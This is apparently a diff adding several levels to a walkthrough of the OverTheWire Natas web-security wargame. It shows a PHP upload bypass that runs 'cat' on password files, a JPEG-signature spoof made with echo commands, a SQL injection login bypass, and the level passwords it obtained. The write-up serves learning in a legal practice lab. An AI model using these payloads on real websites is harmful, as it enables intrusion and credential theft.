@@ -290,3 +290,80 @@ from which the password for the next level can be easily read.
 Lvl. 11 -> 12:
 -----------------
 This time there is a possibility of uploading a JPEG-file of a max size of 1KB as well as another hyperlink to view the source code.
+Looking at the source code it seems that once one upload an image, provided it is within the legal size limit, it is then saved at a random path, but with the same file name.
+Uploading any image file seems to save it on the server as a .jpg. Even if the file is a .png. One of the lines of the source code reads
+
+    <input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
+
+which means that the file name is changed before upload. Opening up the developer tool allows one to change this, so that the extension of the uploaded file does not become a .jpg, but a .php. What is really wanted is the following PHP code to be executed:
+
+    <?php
+    passthru('cat /etc/natas_webpass/natas13');
+    ?>
+
+so I wrote that into a script, called "natas12.php" and uploaded it. Together with the change to the source code of the site, opening up the link to the uploaded file (that one is provided with after a succesful upload), the PHP code is run and the password for the next level is printed out to the screen. This password is
+
+    trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+and now the journey can continue.
+
+
+
+
+Lvl. 12 -> 13:
+-----------------
+Same thing again, except now only image files are accepted. The file type is checked using the
+
+    exif_imagetype()
+
+function from PHP. This just reads the signature of an image file in order to determine the image type. The signature of a JPEG is
+
+    \xFF\xD8\xFF\xE0
+
+so
+
+    $ echo -e "\xFF\xD8\xFF\xE0" > natas13.php
+
+followed by
+
+    $ echo -n "<?php passthru('cat /etc/natas_webpass/natas14'); ?>" >> natas13.php
+
+creates a PHP file with the signature of a JPEG-image, but then appends the relevant PHP-code, that is needed in order to get the password for the next level.
+echo is a linux command, that simply echoes something. The "-e" flag enables interpretation of backslash escapes. The "-n" flag omits trailing newline characters.
+Together with the trick with changing the file extension before upload (by editing in the source code), this makes sure that the file is succesfully uploaded and a link to it is then received. Clicking the link prints out
+
+    ���� z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+from which it seems that
+
+    z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+is the password for the next level.
+
+
+
+
+Lvl. 13 -> 14:
+-----------------
+This time a login page appears alongside a hyperling to show the source code.
+The source code reveals that in order to log in, the login details comes from some MySQL-database. If the username and the password is correct, then the password for the next level is printed. Otherwise, one is met with the text "Access denied!".
+Most importantly, the input is not sanitised, so an SQL injection is the obvious way to go. The request can then be made to go for the user "natas15" and ignore the rest, by commenting it out (as SQL databases treat requests word by word) using
+
+    natas15"#
+
+and one then gets
+
+    Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+from which the password for the next level is clearly obtained.
+The idea here is that the quoation mark finishes the input field and the hashtag comments out the rest of the SQL query.
+
+
+
+
+Lvl. 14 -> 15:
+-----------------
+This time there is a box to check whether or not a user exists and a hyperlink to check the source code.
+Again a MySQL database is used and the input is not sanitised, so an SQL injection should be possible again.
+One can quickly check that the user "natas16" indeed exists, as was almost expected.
+
